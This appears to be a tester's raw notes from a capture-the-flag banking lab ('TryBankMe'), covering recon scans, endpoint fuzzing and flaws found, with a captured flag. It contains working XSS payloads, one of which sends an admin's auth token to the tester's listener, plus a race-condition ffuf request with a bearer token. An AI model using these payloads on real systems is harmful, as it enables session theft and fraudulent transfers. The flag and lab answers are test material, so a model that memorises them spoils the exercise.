For client-side vulnerabilities, such as Cross-Site Scripting, TryBankMe has a security engineer on call that can verify your finding. In order to verify your finding, please provide the username and password of the account that your client-side attack targets. Your client-side attack should add a new cookie with the name XSS and the value XSS to the target's browser session. Once ready, you can provide these credentials to the TryBankMe security engineer by making the following cURL request:

curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user_one", "password" : "password" }' http://10.200.150.100:8080/api/v1.0/xss

# 10.200.150.100




## nnmap
- block of this command nmap -sV -sC --script vuln 10.112.145.155

PORT     STATE SERVICE    VERSION
80/tcp   open  http       nginx 1.24.0 (Ubuntu)
8080/tcp open  http-proxy Werkzeug/3.1.3 Python/3.12.3
...
Nmap done: 1 IP address (1 host up) scanned in 4.12 seconds

## gobuster :8080
gobuster dir \
  -u http://10.200.150.100:8080/api/v1.0/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  --exclude-length 695 \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNvbGRhcG9sZGEiLCJyb2xlIjowLCJleHAiOjE3NzI1MjYwNTJ9.du1_k_fRz5JnDY6JZp1vMjtveo_5XgQzgczdFt890Pg" \
  -H "Origin: http://10.200.150.100"

/user                 (Status: 200) [Size: 85]
/account              (Status: 200) [Size: 3]
/card                 (Status: 200) [Size: 3]
/loan                 (Status: 200) [Size: 3]
/vault                (Status: 200) [Size: 3]
/transaction          (Status: 200) [Size: 3]



## login 
sqlmap not
HEAD, OPTIONS, POST, GET


## signin
sqlmap not



## file upload
- no server side file format checking (loading to uploading whatever file)
- encoded in base64 => no ecryption key, whoever can decrypt file
- use cannot access other's users files knowing the user's vault_number (no exploit)




## /transactions 

upon reviewing index.js script i have found several dangerouslySetInnerHTML calls

<img src=x onerror=(document.cookie='XSS=XSS')>
&lt;img src=&quot;fdsa&quot; onerror=(alert(&quot;fdsa&quot;))&gt;
<img src="fdsa" onerror=(document.cookie='XSS=working')>

90ced82a-7ce9-41f9-be9c-8efb7941a541

THM{1953c037-6e16-437b-b045-59b3a41b5c16}


# accounts
## soldapolda
- account: 
  - test
  - 90ced82a-7ce9-41f9-be9c-8efb7941a541

- card
  - 4206764003063992, 060481834707
  - 393
  - 1/8

- loan
  - f4e17172-5313-43c5-8941-7d659b559aab

- vault
  - 186b9c52-66ac-4538-b412-2eafb674713f

## testtest
- account: 
  - test
  - a2ed3f25-e1cb-4bfd-b2ff-7b750bb38f6b

- card
  - 503866209409
  - 071
  - 1/1

- loan
  - aeb689f6-1ace-4b28-8447-916dca99c4e3

- vault
  - 8557f685-d050-4c84-8528-ffa3dbf79554

## karel
- account: 
  - c263da44-27d4-4913-ba86-19b5b3a8b004

- transaction
  - 75f1fa9a-83cb-4574-8944-f66e003db9a7
  - c17830db-127f-4df3-ae98-79c2a210f49d

- loan
  - 7f01ac9d-48ee-42e8-addf-4a6de9e5b3cb


## admin user
create new accoutn, is is saying initial deposit 0 but on creation i get 100 dolars

username: administrator, password: password
user.role = 0


## xss


/loads/create
- field "purpose of loan" is vulnerable to inserting XSS
- insert this payload
`<img src=x onerror="new Image().src='http://10.112.112.145:4444/?token=' + localStorage.getItem('token');">`
- start web server
`python3 -m http.server 4444`
after admin looks at the loan his auth token appears in console and we can steel his account
(no flag)


race condition okey

ffuf -w numbers.txt -u http://10.200.150.100:8080/api/v1.0/transaction    -X POST    -H "Host: 10.200.150.100:8080"    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0"    -H "Accept: application/json"    -H "Accept-Language: en-GB,en;q=0.9"    -H "Accept-Encoding: gzip, deflate, br"    -H "Content-Type: application/json"    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0Iiwicm9sZSI6MCwiZXhwIjoxNzcyNTQ0Njk1fQ.ZXE86yz5cQhQdh3bw5PD77dYB_M5wmhNiNRIv6Q9J3Q"    -H "Origin: http://10.200.150.100"    -H "Connection: keep-alive"    -H "Referer: http://10.200.150.100/"    -d '{"account_from":"a2ed3f25-e1cb-4bfd-b2ff-7b750bb38f6b","account_to":"c263da44-27d4-4913-ba86-19b5b3a8b004","amount":5,"message":"race_FUZZ"}'    -t 15    -rate 0    -mc all    -v
